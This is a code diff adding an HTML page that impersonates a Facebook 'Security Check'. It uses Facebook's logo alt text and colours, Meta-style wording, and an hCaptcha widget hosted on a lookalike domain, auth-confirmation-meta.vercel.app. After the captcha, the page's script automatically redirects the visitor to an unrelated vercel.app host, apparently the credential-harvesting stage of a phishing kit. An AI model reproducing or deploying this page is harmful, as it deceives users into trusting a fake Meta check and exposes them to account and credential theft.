@@ -1,0 +1,83 @@
+<html lang="en"><head>
+    <title>Security Check</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
+    <script src="https://js.hcaptcha.com/1/api.js" async="" defer=""></script>
+    
+    <style>
+      body {
+        background-color: #f0f2f5;
+      }
+      .header {
+        background-color: #3b5998;
+        padding: 15px;
+        text-align: center;
+      }
+      .header img {
+        height: 32px;
+      }
+      .container-box {
+        background: #ffffff;
+        border: 1px solid #ddd;
+        padding: 20px;
+        margin-top: 40px;
+        box-shadow: 0px 0px 5px rgba(0, 0, 0, 0.1);
+        border-radius: 5px;
+      }
+      .security-title {
+        font-size: 16px;
+        font-weight: bold;
+        margin-bottom: 10px;
+      }
+      .security-text {
+        font-size: 13px;
+        color: #65676b;
+        margin-bottom: 10px;
+      }
+      .continue-btn {
+        background-color: #1877f2;
+        border: none;
+        color: white;
+        font-size: 14px;
+        font-weight: bold;
+        width: 100%;
+        padding: 10px;
+        margin-top: 10px;
+        border-radius: 5px;
+      }
+      .continue-btn:disabled {
+        background-color: #b0c4de;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="header">
+      <img src="perdiqka.png" alt="Facebook">
+    </div>
+    
+    <div class="container d-flex justify-content-center">
+      <div class="col-md-5 container-box">
+        <p class="security-title">Security check</p>
+        <div class="h-captcha" data-sitekey="8824dfc8-25da-42e8-a72c-5b7aecce6076" data-callback="onCaptchaComplete"><iframe src="https://newassets.hcaptcha.com/captcha/v1/fe490febf8ce2186990346eb596f68fafef50dd5/static/hcaptcha.html#frame=checkbox&amp;id=0va5um6cluz9&amp;host=auth-confirmation-meta.vercel.app&amp;sentry=true&amp;reportapi=https%3A%2F%2Faccounts.hcaptcha.com&amp;recaptchacompat=true&amp;custom=false&amp;hl=en&amp;tplinks=on&amp;pstissuer=https%3A%2F%2Fpst-issuer.hcaptcha.com&amp;sitekey=8824dfc8-25da-42e8-a72c-5b7aecce6076&amp;theme=light&amp;origin=https%3A%2F%2Fauth-confirmation-meta.vercel.app" tabindex="0" frameborder="0" scrolling="no" allow="private-state-token-issuance 'src'; private-state-token-redemption 'src'" title="Widget containing checkbox for hCaptcha security challenge" data-hcaptcha-widget-id="0va5um6cluz9" data-hcaptcha-response="" style="pointer-events: auto; background-color: rgba(255, 255, 255, 0); width: 303px; height: 78px; overflow: hidden;"></iframe><textarea id="g-recaptcha-response-0va5um6cluz9" name="g-recaptcha-response" style="display: none;"></textarea><textarea id="h-captcha-response-0va5um6cluz9" name="h-captcha-response" style="display: none;"></textarea></div>
+        <p class="security-text">This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.</p>
+        <button type="button" id="continueButton" class="continue-btn" disabled="" onclick="redirectUser()">Continue</button>
+      </div>
+    </div>
+
+    <script>
+      function onCaptchaComplete() {
+        document.getElementById('continueButton').disabled = false;
+        // Auto-redirect after captcha completion
+        setTimeout(function () {
+          window.location.href = 'https://diablo-cjhwpo-d831.vercel.app';
+        }, 1000);
+      }
+
+      function redirectUser() {
+        window.location.href = 'https://diablo-cjhwpo-d831.vercel.app';
+      }
+    </script>
+  
+
+<div aria-hidden="true" style="background-color: rgb(255, 255, 255); border: 1px solid rgb(215, 215, 215); box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 4px; border-radius: 4px; left: auto; top: -10000px; z-index: -2147483648; position: absolute; pointer-events: auto; transition: opacity 0.15s ease-out; opacity: 0; visibility: hidden;"><div style="position: relative; z-index: 1;"><iframe src="https://newassets.hcaptcha.com/captcha/v1/fe490febf8ce2186990346eb596f68fafef50dd5/static/hcaptcha.html#frame=challenge&amp;id=0va5um6cluz9&amp;host=auth-confirmation-meta.vercel.app&amp;sentry=true&amp;reportapi=https%3A%2F%2Faccounts.hcaptcha.com&amp;recaptchacompat=true&amp;custom=false&amp;hl=en&amp;tplinks=on&amp;pstissuer=https%3A%2F%2Fpst-issuer.hcaptcha.com&amp;sitekey=8824dfc8-25da-42e8-a72c-5b7aecce6076&amp;theme=light&amp;origin=https%3A%2F%2Fauth-confirmation-meta.vercel.app" frameborder="0" scrolling="no" allow="private-state-token-issuance 'src'; private-state-token-redemption 'src'" title="Main content of the hCaptcha challenge" style="border: 0px; z-index: 2000000000; position: relative;"></iframe></div><div style="width: 100%; height: 100%; position: fixed; pointer-events: none; top: 0px; left: 0px; z-index: 0; background-color: rgb(255, 255, 255); opacity: 0.05;"></div><div style="border-width: 11px; position: absolute; pointer-events: none; margin-top: -11px; z-index: 1; right: 100%;"><div style="border-width: 10px; border-style: solid; border-color: transparent rgb(255, 255, 255) transparent transparent; position: relative; top: 10px; z-index: 1;"></div><div style="border-width: 11px; border-style: solid; border-color: transparent rgb(215, 215, 215) transparent transparent; position: relative; top: -11px; z-index: 0;"></div></div></div></body></html>
